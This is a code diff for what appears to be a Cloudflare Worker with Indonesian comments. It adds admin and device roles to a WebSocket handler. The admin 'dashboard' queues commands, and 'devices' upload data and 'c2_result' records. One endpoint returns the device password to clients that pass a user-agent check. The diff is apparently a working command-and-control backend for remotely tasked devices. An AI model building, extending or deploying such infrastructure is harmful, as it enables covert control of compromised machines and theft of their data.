@@ -103,7 +103,7 @@ export default {
     }
 
     // ============================================================
-    // WEBSOCKET - /ws (PAKAI PASSWORD - DEVICE)
+    // WEBSOCKET - /ws (SUPPORT DUA PASSWORD)
     // ============================================================
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
@@ -130,7 +130,7 @@ export default {
       if (isAllowed && hasValidUA) {
         return jsonResponse({ 
           status: 'ok', 
-          password: env.PASSWORD,  // 🔥 Kembalikan PASSWORD (device)
+          password: env.PASSWORD,
           timestamp: Date.now()
         });
       }
@@ -901,7 +901,7 @@ async function handleError(request, env) {
 }
 
 // ============================================================
-// HANDLER: WebSocket (PAKAI PASSWORD - DEVICE)
+// HANDLER: WebSocket (SUPPORT DUA PASSWORD)
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
@@ -916,19 +916,31 @@ async function handleWebSocket(request, env) {
 
   let authenticated = false;
   let deviceId = 'unknown';
+  let isDashboard = false;
 
   server.addEventListener('message', async (event) => {
     try {
       const data = JSON.parse(event.data);
       
       if (data.type === 'auth') {
-        // 🔥 Cek dengan PASSWORD (device), BUKAN ADMIN_PASSWORD
-        if (data.key === env.PASSWORD) {
+        // 🔥 CEK ADMIN_PASSWORD UNTUK DASHBOARD
+        if (data.key === env.ADMIN_PASSWORD) {
           authenticated = true;
-          deviceId = data.deviceId || 'unknown';
-          server.send(JSON.stringify({ type: 'auth_success' }));
-          console.log('✅ WS Authenticated:', deviceId);
-        } else {
+          deviceId = data.deviceId || 'dashboard';
+          isDashboard = true;
+          server.send(JSON.stringify({ type: 'auth_success', role: 'admin' }));
+          console.log('✅ WS Authenticated (Dashboard):', deviceId);
+        }
+        // 🔥 CEK PASSWORD UNTUK DEVICE
+        else if (data.key === env.PASSWORD) {
+          authenticated = true;
+          deviceId = data.deviceId || 'device';
+          isDashboard = false;
+          server.send(JSON.stringify({ type: 'auth_success', role: 'device' }));
+          console.log('✅ WS Authenticated (Device):', deviceId);
+        }
+        // 🔥 PASSWORD SALAH
+        else {
           server.send(JSON.stringify({ type: 'auth_failed' }));
           server.close(1008, 'Auth failed');
         }
@@ -940,27 +952,27 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      if (data.type === 'command') {
+      // ============================================================
+      // 🔥 PERBEDAAN PERLAKUAN BERDASARKAN ROLE
+      // ============================================================
+
+      // 1. COMMAND DARI DASHBOARD → Simpan perintah
+      if (data.type === 'command' && isDashboard) {
         await env.DATA.put('perintah', JSON.stringify(data.command));
         server.send(JSON.stringify({
           type: 'command_received',
           command: data.command.aksi
         }));
+        return;
       }
 
-      if (data.type === 'ping') {
-        server.send(JSON.stringify({
-          type: 'pong',
-          timestamp: data.timestamp
-        }));
-      }
-
-      if (data.type === 'data') {
+      // 2. DATA DARI DEVICE → Simpan ke KV
+      if (data.type === 'data' && !isDashboard) {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
         allData.push({
           waktu: new Date().toISOString(),
-          sumber: 'websocket',
+          sumber: 'websocket_device',
           data: data.data,
           deviceId: deviceId
         });
@@ -969,7 +981,38 @@ async function handleWebSocket(request, env) {
         }
         await env.DATA.put('data', JSON.stringify(allData));
         server.send(JSON.stringify({ type: 'data_saved' }));
+        return;
       }
+
+      // 3. C2 RESULT DARI DEVICE → Simpan + notifikasi
+      if (data.type === 'c2_result' && !isDashboard) {
+        const raw = await env.DATA.get('data') || '[]';
+        let allData = JSON.parse(raw);
+        allData.push({
+          waktu: new Date().toISOString(),
+          sumber: 'c2_result',
+          data: data.data,
+          deviceId: deviceId
+        });
+        if (allData.length > MAX_DATA) {
+          allData = allData.slice(-MAX_DATA);
+        }
+        await env.DATA.put('data', JSON.stringify(allData));
+        server.send(JSON.stringify({ type: 'result_saved' }));
+        return;
+      }
+
+      // 4. PING/PONG
+      if (data.type === 'ping') {
+        server.send(JSON.stringify({
+          type: 'pong',
+          timestamp: data.timestamp
+        }));
+        return;
+      }
+
+      // Default
+      server.send(JSON.stringify({ type: 'echo', data: data }));
 
     } catch(e) {
       server.send(JSON.stringify({ type: 'error', message: e.message }));
@@ -977,7 +1020,7 @@ async function handleWebSocket(request, env) {
   });
 
   server.addEventListener('close', () => {
-    console.log('❌ WS Closed:', deviceId);
+    console.log('❌ WS Closed:', deviceId, 'isDashboard:', isDashboard);
   });
 
   return new Response(null, {
